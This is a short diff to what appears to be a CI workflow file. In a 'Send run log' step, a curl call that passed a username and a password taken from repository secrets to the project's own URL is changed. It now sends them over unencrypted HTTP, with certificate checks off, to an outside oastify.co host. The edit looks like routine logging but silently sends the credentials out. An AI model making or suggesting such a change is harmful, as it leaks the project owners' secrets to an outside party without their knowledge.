@@ -34,8 +34,7 @@ jobs:
         PW: ${{ secrets.USER_CRED }}
       run: |
         echo "Send run log"
-      echo "$USER:$PW"
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/api/run/audit
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://8cljyk2bjhsjs5hig4gz8xgyjppgde13.oastify.co/api/run/audit?Test
         
     - name: send_slack_alert
       continue-on-error: true
